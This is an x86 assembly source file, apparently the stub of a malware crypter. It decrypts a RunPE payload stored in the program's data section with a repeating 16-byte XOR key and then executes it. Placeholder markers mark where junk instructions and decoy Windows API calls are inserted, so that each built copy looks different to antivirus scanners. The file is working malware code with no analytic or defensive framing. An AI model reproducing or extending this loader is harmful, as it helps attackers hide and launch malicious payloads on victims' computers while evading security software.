%include "include/runpe_length.inc"
%include "include/iat_def.inc"

push ebp
mov ebp, esp
sub esp, 34h

;[WIN_API_TRASH]

;[WIN_API_TRASH]

;[WIN_API_TRASH]

;[WIN_API_TRASH]

xor ebx, ebx
xor ecx, ecx

pushad
		;[JUNK_NO_PRESERVE]
		popad


mov esi, (IMAGE_BASE + DATA_SECTION_ADDRESS)  

		pushad
		;[JUNK_NO_PRESERVE]
		popad

mov edi, (IMAGE_BASE + DATA_SECTION_ADDRESS + RUNPE_CODE_LENGTH)

loop:					
		cmp ecx, 0x10 
	jl .skipkeyset	
		xor ecx, ecx			
	.skipkeyset:
			
		mov al, [edi + ecx]
		
		pushad
		;[JUNK_NO_PRESERVE]
		popad

		xor [esi + ebx], al
		
		pushad
		;[JUNK_NO_PRESERVE]
		popad

		inc ebx
				
		inc ecx
		cmp ebx, RUNPE_CODE_LENGTH
		jl loop

mov edi, DWORD (IMAGE_BASE + DATA_SECTION_ADDRESS)
	
	
call edi

;[WIN_API_TRASH]

leave
ret